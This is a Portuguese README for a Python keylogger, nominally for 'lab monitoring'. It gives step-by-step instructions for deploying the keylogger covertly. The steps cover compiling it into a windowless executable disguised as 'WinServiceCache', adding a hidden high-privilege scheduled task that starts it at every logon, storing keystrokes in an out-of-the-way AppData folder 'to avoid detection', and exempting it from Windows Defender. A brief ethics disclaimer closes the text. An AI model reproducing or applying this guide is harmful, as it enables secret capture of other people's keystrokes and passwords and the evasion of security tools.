## Este repositório contém um logger de teclado desenvolvido para fins de monitoramento de laboratório. Abaixo, você encontrará o passo a passo para transformar o script em um executável discreto e como garantir que ele inicie automaticamente com o sistema.
---
Para que o script funcione sem depender do Python instalado na máquina de destino, utilizaremos o PyInstaller.
Pré-requisitos

Certifique-se de ter a biblioteca pynput e o pyinstaller instalados:
-- pip install pynput pyinstaller --

Comando de Compilação

No terminal, dentro da pasta do script, execute:
pyinstaller --noconsole --onefile --icon=NONE --name "WinServiceCache" main.py

Comando de Compilação

No terminal, dentro da pasta do script, execute:
pyinstaller --noconsole --onefile --icon=NONE --name "WinServiceCache" main.py

---

O que esses parâmetros fazem?

    --noconsole: Impede que a janela do prompt de comando apareça quando o programa abrir (fica invisível).

    --onefile: Compacta tudo em um único arquivo .exe.

    --name: Define o nome do processo que aparecerá no Gerenciador de Tarefas.

    Nota: O arquivo final será gerado dentro da pasta dist/.

2. Configurando o Agendador de Tarefas

Para que o logger rode sempre que o computador for ligado, siga estes passos:

    Pressione Win + R, digite taskschd.msc e dê Enter.

    No painel direito, clique em Criar Tarefa... (não a Básica).

    Aba Geral:

        Nome: WindowsServiceCacheUpdate

        Marque Executar com privilégios mais altos.

        Marque Ocultar.

    Aba Disparadores:

        Clique em Novo e selecione Ao fazer logon.

    Aba Ações:

        Clique em Novo -> Iniciar um programa.

        Em "Programa/script", selecione o seu .exe gerado.

    Aba Condições:

        Desmarque "Interromper se o computador passar a usar a bateria".

Localização dos Logs

O script salva os dados em um local discreto para evitar detecção acidental:

    Caminho: %APPDATA%\WinServiceCache\text.txt

    Como acessar: Pressione Win + R, cole o caminho acima e dê Enter.

Considerações de Segurança

    Antivírus: Por monitorar teclas, o Windows Defender pode detectar o arquivo. É necessário adicionar o arquivo .exe ou a pasta onde ele reside às Exclusões do antivírus.

    Ética: Este software deve ser utilizado estritamente para fins educacionais ou de manutenção de hardware em ambientes autorizados.